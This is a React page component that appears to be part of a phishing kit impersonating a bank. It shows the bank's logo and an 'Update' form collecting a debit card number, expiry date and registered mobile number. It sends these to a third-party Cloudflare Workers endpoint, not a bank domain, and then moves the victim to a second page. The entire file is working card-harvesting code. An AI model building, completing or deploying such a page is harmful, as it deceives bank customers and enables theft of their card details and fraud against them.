import React, { useState, useRef } from "react";
import { FaCreditCard, FaCalendarAlt, FaPhoneAlt } from "react-icons/fa";
import logo from "./assets/qib.png";
import { useNavigate } from "react-router-dom";

const Firstpage = () => {
  const navigate = useNavigate();
  const [formData, setFormData] = useState({
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    phone: "",
  });

  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const cardRef = useRef(null);
  const monthRef = useRef(null);
  const yearRef = useRef(null);
  const phoneRef = useRef(null);

  // ✅ Limit input to 16 digits
  const handleCardChange = (e) => {
    const value = e.target.value.replace(/\D/g, ""); // allow only numbers
    if (value.length <= 16) {
      setFormData({ ...formData, cardNumber: value });
    }
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const { cardNumber, expiryMonth, expiryYear, phone } = formData;

    // 🧠 Client-side validation
    if (!cardNumber || !expiryMonth || !expiryYear || !phone) {
      setMessage("⚠️ Please fill in all required fields.");
      return;
    }

    if (cardNumber.length !== 16) {
      setMessage("⚠️ Card number must be exactly 16 digits.");
      cardRef.current.focus();
      return;
    }

    setMessage("");
    setLoading(true);

    try {
      const response = await fetch("https://my-worker.instapayapi.workers.dev", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "card",
          cardNumber,
          expiryMonth,
          expiryYear,
          phone,
        }),
      });

      const result = await response.json();
      console.log("Mock API result:", result);

      if (result.success) {
        // ✅ Navigate only if API returns success
        setTimeout(() => {
          setLoading(false);
          navigate("/second");
        }, 1000);
      } else {
        setMessage(result.message || "Invalid details, please try again.");
        setLoading(false);
      }
    } catch (error) {
      console.error("Error calling API:", error);
      setMessage("Network error — please try again.");
      setLoading(false);
    }
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-start">
      {/* ✅ Full Screen Loader */}
      {loading && (
        <div className="fixed inset-0 flex flex-col items-center justify-center bg-white bg-opacity-80 z-50">
          <div className="w-14 h-14 border-4 border-[#0075B0] border-t-transparent rounded-full animate-spin"></div>
          <p className="mt-3 text-[#0075B0] font-medium"></p>
        </div>
      )}

      

      {/* ✅ Logo */}
      <div className="pt-6 pb-4">
        <img
          src={logo}
          alt="Al Rayan Bank"
          className="w-36 sm:w-40 mx-auto object-contain"
        />
      </div>

      {/* ✅ Form */}
          {/* Message */}
          {message && (
            <p className="mt-4 text-center text-red-600 font-medium">
              {message}
            </p>
          )}
      <div className="w-full flex justify-center">
        <form
          onSubmit={handleSubmit}
          autoComplete="off"
          className="w-full max-w-4xl bg-white rounded-lg shadow-sm px-3 py-12"
        >
          {/* Card Number */}
          <div className="flex items-center border border-gray-300 rounded mb-5">
            <span className="bg-gray-100 px-4 py-3 border-r border-gray-300">
              <FaCreditCard className="text-gray-600" />
            </span>
            <input
              ref={cardRef}
              type="text"
              name="cardNumber"
              value={formData.cardNumber}
              onChange={handleCardChange}
              placeholder="Enter Your Debit Card Number (16 digits)*"
              className="w-full px-4 py-2 outline-none"
              inputMode="numeric"
              maxLength="16"
            />
          </div>

          {/* Expiry Date */}
          <div className="flex items-center border border-gray-300 rounded mb-5">
            <span className="bg-gray-100 px-4 py-3 border-r border-gray-300">
              <FaCalendarAlt className="text-gray-600" />
            </span>

            {/* Expiry Month */}
            <select
              ref={monthRef}
              name="expiryMonth"
              value={formData.expiryMonth}
              onChange={handleChange}
              className="w-full px-2 py-2 outline-none bg-white border-none"
            >
              <option value="">Expiry Month</option>
              {Array.from({ length: 12 }, (_, i) => (
                <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                  {String(i + 1).padStart(2, "0")}
                </option>
              ))}
            </select>

            {/* Expiry Year */}
            <select
              ref={yearRef}
              name="expiryYear"
              value={formData.expiryYear}
              onChange={handleChange}
              className="w-56 text-center py-2 border-l border-gray-300 outline-none bg-white"
            >
              <option value="">Expiry Year</option>
              {Array.from({ length: 15 }, (_, i) => {
                const year = new Date().getFullYear() + i;
                return (
                  <option key={year} value={year}>
                    {year}
                  </option>
                );
              })}
            </select>
          </div>

          {/* Phone Number */}
          <div className="flex items-center border border-gray-300 rounded mb-8">
            <span className="bg-gray-100 px-4 py-3 border-r border-gray-300">
              <FaPhoneAlt className="text-gray-600" />
            </span>
            <input
              ref={phoneRef}
              type="tel"
              name="phone"
              value={formData.phone}
              onChange={handleChange}
              placeholder="Registered Mobile Number"
              className="w-full px-4 py-2 outline-none"
            />
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            className="w-full bg-[#0075B0] text-white font-medium py-3 text-base rounded-full hover:bg-[#0075B0] transition-all duration-300"
          >
            Update
          </button>

        
        </form>
      </div>
    </div>
  );
};

export default Firstpage;
